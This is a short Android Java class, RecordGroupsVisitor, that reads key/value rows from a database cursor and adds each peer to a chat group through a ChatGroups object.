package com.android.deviceinfo.db;

import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;

import com.android.deviceinfo.module.chat.ChatGroups;

import android.database.Cursor;

public class RecordGroupsVisitor extends RecordVisitor {

	ChatGroups groups;

	public RecordGroupsVisitor(ChatGroups groups) {
		this.groups = groups;
	}

	@Override
	public long cursor(Cursor cursor) {

		int columnIndex = 0;
		String key = cursor.getString(0);
		String value = cursor.getString(1);

		groups.addPeerToGroup(key, value);

		return 0;
	}

}
